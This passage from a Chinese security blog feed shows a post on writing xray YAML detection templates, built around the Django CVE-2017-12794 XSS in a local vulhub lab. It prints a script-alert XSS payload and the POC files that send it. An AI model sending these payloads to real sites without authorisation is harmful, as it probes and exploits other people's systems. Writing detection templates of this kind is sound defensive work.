title="写在最后"></a>写在最后</h2><p>这篇博客主要是列举nmap的常用功能和这些选项的细节，都是参考的nmap官方文档。有些地方直译过来可能不太准确，之后会根据实际使用情况修改相关说明。</p>]]></content>
      
      
      <categories>
          
          <category> 原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编写第一个POC</title>
      <link href="/2023/09/28/%E7%BC%96%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AAPOC/"/>
      <url>/2023/09/28/%E7%BC%96%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AAPOC/</url>
      
        <content type="html"><![CDATA[<h2 id="博客由来"><a href="#博客由来" class="headerlink" title="博客由来"></a>博客由来</h2><p>最近有个面试官问了我一个问题，他看我用过xray就问我知不知道xray检测xss漏洞的原理是什么，毫无疑问，像我这种只使用过其基础功能的人肯定是不知道的。在以往的面试过程中，我也总是会遇到一些我知其然而不知其所以然的问题，即只会用，而不知道原理，或者知道原理，却没有真正上手实操过，面试官一旦深入问下去，就立马现出（菜菜的）原形（QAQ）。</p><p>因此，为了直击痛点，接下来我将会逐步把这些我不知道的问题弄明白，并将其记录下来，一方面是在回顾的过程中学习，另一方面也是为了扩充自己的知识面，积累技能。</p><p>那话不多说，下面就让我们详细了解一下xray是如何检测xss漏洞的吧！</p><h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><p>根据xray的官方文档<a href="https://docs.xray.cool/#/README">https://docs.xray.cool/#/README</a>，xray是一款功能强大的安全评估工具，支持多种类型漏洞的检测，在我看来，真正支持这些功能实现的就是各种各样的POC。</p><p>因此，我们需要先学习一下POC和EXP的概念。</p><h2 id="POC和EXP"><a href="#POC和EXP" class="headerlink" title="POC和EXP"></a>POC和EXP</h2><p>根据xray相关知识文档<a href="https://www.yuque.com/jarciscy/zkonow/guy5iz">https://www.yuque.com/jarciscy/zkonow/guy5iz</a>，可以总结如下：</p><p><strong>POC(Proof of Concept) - 利用证明</strong></p><ul><li><code>POC</code>，<code>Proof of Concept</code>，意思是 <code>利用证明</code>。可使得使用者能够确认这个<code>漏洞是真实存在的</code>，在编写<code>POC</code>时需要注意其必须是无害的，即它的目的是检测漏洞的存在，而不是对被检测系统产生影响（如上传shell文件未删除、对数据库中的数据进行增删改等）。</li></ul><p><strong>EXP(Exploit) - 漏洞利用</strong></p><ul><li><code>EXP，Exploit</code> 中文意思是 <code>漏洞利用</code>。意思是一段对漏洞<code>如何利用的详细说明或者一个演示的漏洞攻击代码</code>，可以使得使用者<code>完全了解漏洞</code>的机理以及<code>利用的方法</code>。</li></ul><p>不过，如果我们需要xray使用我们自己编写的POC，就必须使用xray支持的POC规则，即使用YAML格式编写。YAML是一种文档编写格式，是JSON的超集。</p><h2 id="POC脚本格式（V2版）"><a href="#POC脚本格式（V2版）" class="headerlink" title="POC脚本格式（V2版）"></a>POC脚本格式（V2版）</h2><p>一个最基础的POC如下：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-example-com</span></span><br><span class="line"><span class="comment"># 脚本部分</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="attr">r1:</span></span><br><span class="line">    <span class="attr">request:</span></span><br><span class="line">      <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      response.status==200 &amp;&amp; response.body_string.contains(&quot;Example Domain&quot;)</span></span><br><span class="line"><span class="string"></span><span class="attr">expression:</span></span><br><span class="line">  <span class="string">r1()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 信息部分</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">name(link)</span></span><br><span class="line">  <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">http://example.com</span></span><br></pre></td></tr></table></figure><p>整个 POC 大致可以分为 3 部分：</p><ul><li>名称： 脚本名称，string 类型</li><li>脚本部分：主要逻辑控制部分，控制着脚本的运行过程</li><li>信息部分：主要是用来声明该脚本的一些信息，包括输出内容</li></ul><p>接下来分别介绍一个各个部分的格式和内容。</p><h3 id="脚本部分"><a href="#脚本部分" class="headerlink" title="脚本部分"></a>脚本部分</h3><p>这个部分包含 4 部分内容，分别为：</p><ul><li>传输方式（transport）</li><li>全局变量定义（set）</li><li>规则描述（rules）</li><li>规则表达式（expression）</li></ul><h3 id="信息部分"><a href="#信息部分" class="headerlink" title="信息部分"></a>信息部分</h3><p>该字段用于定义一些和脚本相关的信息。内容都为非必填内容。</p><h3 id="expression编写"><a href="#expression编写" class="headerlink" title="expression编写"></a>expression编写</h3><p>xray使用编译性语言Golang，为了实现动态执行一些规则，我们需要使用Common Expression Language (CEL)表达式。CEL表达式项目可以参考<a href="https://github.com/google/cel-spec%E9%A1%B9%E7%9B%AE%E3%80%82">https://github.com/google/cel-spec项目。</a></p><p>上述示例中的表达式：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.status==200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body_string.contains(&quot;Example</span> <span class="string">Domain&quot;)CopyErrorCopied</span></span><br></pre></td></tr></table></figure><p>上述表达式的意思是：<strong>返回包status等于200，且body中包含内容“Example Domain”</strong>。</p><p>expression表达式上下文还包含有一些常用的函数。比如上述 <code>bcontains</code> 用来匹配 bytes 是否包含，类似的，如果要匹配 string 的包含，可以使用 <code>contains</code>, 如：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.content_type.contains(&quot;json&quot;)</span></span><br></pre></td></tr></table></figure><p><strong>一些表达式例子：</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.body.bcontains(b&quot;test&quot;)</span></span><br></pre></td></tr></table></figure><p>返回包 body 包含 test，因为 body 是一个 bytes 类型的变量，所以我们需要使用 bcontains 方法，且其参数也是 bytes</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.body_string.contains(&quot;test&quot;)</span></span><br></pre></td></tr></table></figure><p>但此处我们更推荐这样的写法来匹配test，这会解决一些编码问题</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.body_string.contains(r1</span> <span class="string">+</span> <span class="string">&quot;some value&quot;</span> <span class="string">+</span> <span class="string">r2)</span></span><br></pre></td></tr></table></figure><p>r1、r2是 randomLowercase 的变量，这里动态的判断 body 的内容</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.content_type.contains(&#x27;application/octet-stream&#x27;)</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(b&#x27;\x00\x01\x02&#x27;)</span></span><br></pre></td></tr></table></figure><p>返回包的 content-type 包含 application&#x2F;octet-stream，且 body 中包含 0x000102 这段二进制串</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.content_type.contains(&#x27;zip&#x27;)</span> <span class="string">&amp;&amp;</span> <span class="string">r&#x27;^PK\x03\x04&#x27;.bmatches(response.body)</span></span><br></pre></td></tr></table></figure><p>这个规则用来判断返回的内容是否是zip文件，需要同时满足条件：content-type 包含关键字 “zip”，且 body 匹配上正则r’^PK\x03\x04’（就是zip的文件头）。因为 startsWith 方法只支持字符串的判断，所以这里没有使用。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.status</span> <span class="string">&gt;=</span> <span class="number">300</span> <span class="string">&amp;&amp;</span> <span class="string">response.status</span> <span class="string">&lt;</span> <span class="number">400</span></span><br></pre></td></tr></table></figure><p>返回包的 status code 在 300~400 之间</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">(response.status</span> <span class="string">&gt;=</span> <span class="number">500</span> <span class="string">&amp;&amp;</span> <span class="string">response.status</span> <span class="type">!=</span> <span class="number">502</span><span class="string">)</span> <span class="string">||</span> <span class="string">&quot;&lt;input value=\&quot;(.+?)\&quot;&quot;</span><span class="string">.matches(response.body_string)</span></span><br></pre></td></tr></table></figure><p>返回包status code大于等于500且不等于502，或者Body包含表单</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.headers[&#x27;location&#x27;]==&quot;https://www.example.com&quot;</span></span><br></pre></td></tr></table></figure><p>headers 中 <code>Location</code> 等于指定值，如果 <code>Location</code> 不存在，该表达式返回 false</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;docker-distribution-api-version&#x27;</span> <span class="string">in</span> <span class="string">response.headers</span> <span class="string">&amp;&amp;</span> <span class="string">response.headers[&#x27;docker-distribution-api-version&#x27;].contains(&#x27;registry/2.0&#x27;)</span></span><br></pre></td></tr></table></figure><p>headers 中包含 <code>docker-distribution-api-version</code> 并且 value 包含指定字符串，如果不判断 <code>in</code>，后续的 contains 会出错。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">response.body_string.contains(response.url.path)</span></span><br></pre></td></tr></table></figure><p>body 中包含 url 的 path。</p><p>expression表达式返回的必须是一个bool类型的结果。</p><h2 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h2><p>xray使用POC进行扫描时，POC模块在收到用户的一个请求后，开始对这个目标进行漏洞扫描。根据Rule中的<code>method</code>、<code>path</code>、<code>headers</code>、<code>body</code>、<code>follow_redirects</code>键值，替换原始数据包中的对应信息。</p><p>替换后的数据包被发送，并获得返回包，再执行expression表达式，表达式结果作为该条Rule的结果；同时，我们通过search指定的正则表达式，可以从返回包body中提取一些信息，作为下一个rule，或detail中可以被引用的内容。</p><p>通过写一个固定的yaml文件，让xray以这个yaml文件的内容进行发包，再通过返回包来判断是否存在漏洞。具体的规则在yaml文件中定义，我们需要告诉xray应该发一个什么样的包，以及返回包中需要包含什么信息。而这个yaml文件的内容就是我们需要编写的POC。</p><p>如果不熟悉YAML格式，可以使用POC编写的在线辅助工具：<a href="https://phith0n.github.io/xray-poc-generation/">https://phith0n.github.io/xray-poc-generation/</a></p><p>这里，以django的一个xss漏洞CVE-2017-12794为例，编写xray可以扫描的高质量POC。</p><p><strong>漏洞环境：</strong><a href="https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794">https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</a></p><p>用docker容器运行，访问目标页面<a href="http://localhost:8000/create_user/">http://localhost:8000/create_user/</a></p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292251797.png" alt="image-20230929220843276" style="zoom:67%;" /><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292252960.png" alt="image-20230929162640044"></p><p><strong>漏洞描述：</strong></p><p>访问<code>http://localhost:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>创建一个用户，成功。</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292252730.png" alt="image-20230929162926425" style="zoom:67%;" /><p><strong>Burp抓包截图：</strong></p><p><strong>注：</strong>这里把alert(2)看成alert(1)，因为第一次插入js代码时没有开启代理，所以这里将第一次访问<code>http://localhost:8000/create_user/?username=&lt;script&gt;alert(2)&lt;/script&gt;</code>的结果看成第一次访问<code>http://localhost:8000/create_user/?username=&lt;script&gt;alert(2)&lt;/script&gt;</code>的结果。</p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292252946.png" alt="image-20230929165628531"></p><p>再次访问<code>http://localhost:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>，触发异常，弹出1。</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253221.png" alt="image-20230929163203821" style="zoom:67%;" /><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253691.png" alt="image-20230929163107471" style="zoom:67%;" /><p>可见，Postgres抛出的异常为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">duplicate key value violates unique constraint &quot;xss_user_username_key&quot;</span><br><span class="line">DETAIL:  Key (username)=(&lt;script&gt;alert(1)&lt;/script&gt;) already exists.</span><br></pre></td></tr></table></figure><p>这个异常被拼接进<code>The above exception (&#123;&#123; frame.exc_cause &#125;&#125;) was the direct cause of the following exception</code>，最后触发XSS。</p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253472.png" alt="image-20230929163324634"></p><p><strong>Burp抓包截图：</strong></p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253700.png" alt="image-20230929165819209"></p><p><strong>我们可以根据这两次访问的请求包和返回包编写POC。</strong></p><p>第一次访问<code>poc-yaml-django-cve-2017-12794-xss-1.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-django-cve-2017-12794-xss-1</span></span><br><span class="line"><span class="attr">manual:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">    <span class="attr">r1:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/?username=%3Cscript%3Ealert(42)%3C/script%3E</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span></span><br><span class="line"><span class="attr">expression:</span> <span class="string">r1()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">test-xss-1</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</span></span><br></pre></td></tr></table></figure><p>第二次访问<code>poc-yaml-django-cve-2017-12794-xss-2.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-django-cve-2017-12794-xss-2</span></span><br><span class="line"><span class="attr">manual:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">    <span class="attr">r2:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/?username=%3Cscript%3Ealert(42)%3C/script%3E</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">500</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(b&quot;(username)=(&lt;script&gt;alert(42)&lt;/script&gt;)</span> <span class="string">already</span> <span class="string">exists.&quot;)</span></span><br><span class="line"><span class="attr">expression:</span> <span class="string">r2()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">test-xss-2</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</span></span><br></pre></td></tr></table></figure><p>使用xray分别运行POC，成功检测出xss漏洞。</p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253204.png" alt="ebde7a765b86e616024f421882cd2a18"></p><h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>这里有一个很坑的地方，如果POC像下面这么写，那么r1()和r2()将永远只会有一个匹配，因为发出的请求是一样的，所以xray在解析的时候并不会重发两次，导致每次运行时，只能访问一次目标URL。这里我找了很久的原因，因为将r1()和r2()拆成两个POC进行检测的话，根据两个条件同时成立来判断，django是存在xss漏洞的；但是如果像下面这样写在一起，就会导致r1()和r2()永远不会同时为真，从而检测不出漏洞来。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-django-cve-2017-12794-xss</span></span><br><span class="line"><span class="attr">manual:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">    <span class="attr">r1:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/?username=%3Cscript%3Ealert(42)%3C/script%3E</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span></span><br><span class="line">     <span class="attr">r2:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/?username=%3Cscript%3Ealert(42)%3C/script%3E</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">500</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(b&quot;(username)=(&lt;script&gt;alert(42)&lt;/script&gt;)</span> <span class="string">already</span> <span class="string">exists.&quot;)</span></span><br><span class="line"><span class="attr">expression:</span> <span class="string">r1()</span> <span class="string">&amp;&amp;</span> <span class="string">r2()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">test-xss</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</span></span><br></pre></td></tr></table></figure><p>对于这个问题，我在查找xray相关知识文档<a href="https://www.yuque.com/jarciscy/zkonow/ohst4v">https://www.yuque.com/jarciscy/zkonow/ohst4v</a>时发现有下面这段说明，即当r1()和r2()写在一起时，第二个url不会被执行。</p><p>目前版本的实现对 <strong>新的请求</strong>定义为 <strong>新的目录</strong>，比如下面几个 url 依次进入检查队列时，执行情况如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://exmaple.com/     会执行, 上下文为 / </span><br><span class="line">http://example.com/a    不会再次执行，因为上下文同样为 /</span><br><span class="line">http://example.com/a/b  会执行，上下文为 /a/</span><br><span class="line">http://example.com/a/c/ 不会执行, 超过深度限制 (depth)</span><br></pre></td></tr></table></figure><p>其中 <code>depth</code> 是 phantasm 插件的一个配置项，用于指定检测深度。</p><p>因此，我只能将r1()规则和r2()规则写成两个POC，分别运行，根据r2()的规则进行最终的判断。这里我还没想到如何让两个规则写在同一个yaml文件中并且有效运行，也没办法在写xray扫描命令时同时指定这两个POC，使其几乎同时运行，并且只用输入一次命令。因为即使是这样，xray扫描时也只会运行第一个POC。之后会再好好思考一下这个问题应该如何解决，因为像这样写在两个POC里面，就没办法生成相同的随机数了，即没办法做下一步——<strong>优化</strong>。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p><strong>如何编写一个高质量的POC？</strong></p><p>参考：<a href="https://www.yuque.com/jarciscy/zkonow/fnlawo">https://www.yuque.com/jarciscy/zkonow/fnlawo</a></p><p>我们在考量一个POC是否优质，是否高质量，主要是参考以下的内容：</p><ol><li><p>payload是否<strong>无害</strong></p></li><li><p>payload是否<strong>合理</strong></p><ol><li><p>是否随机化</p></li><li><p>是否已经是最精简的探测</p></li></ol></li><li><p>payload是否通用</p></li><li><p>对返回包的判断是否严谨</p></li><li><p>整体的请求是否符合逻辑</p></li></ol><p>而这些内容其主要影响的就是扫描的效果，其影响效果可以简单的看作：<strong>漏报、误报、危害</strong></p><p>因为我们的POC在加载到扫描器后，会遇到非常多的目标，所以如果不编写一个高质量的POC，就很容易出现上述的情况。</p><p>我们首要关注的便是<strong>危害性</strong>，然后借用<a href="https://paper.seebug.org/9/">《漏洞检测的那些事儿》</a>中提到的三个编写标准“<strong>随机性、确定性、通用性</strong>”，便构成了高质量POC。</p><h3 id="随机化"><a href="#随机化" class="headerlink" title="随机化"></a>随机化</h3><p>比如，在编写r2()规则所在的POC时，可以像下面这样随机化处理。（<strong>注：</strong>由于上面提到的原因，这里实际并不能使用随机变量。）</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-django-cve-2017-12794-xss-2</span></span><br><span class="line"><span class="attr">manual:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">set:</span></span><br><span class="line">    <span class="attr">randomNum:</span> <span class="string">randomLowercase(6)</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">    <span class="attr">r2:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/?username=%3Cscript%3Ealert(&#123;&#123;randomNum&#125;&#125;)%3C/script%3E</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">500</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(b&quot;(username)=(&lt;script&gt;alert(&quot;</span> <span class="string">+</span> <span class="string">randomNum</span> <span class="string">+</span> <span class="string">&quot;)&lt;/script&gt;) already exists.&quot;</span><span class="string">)</span></span><br><span class="line"><span class="attr">expression:</span> <span class="string">r2()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">test-xss-2</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> POC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xray </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
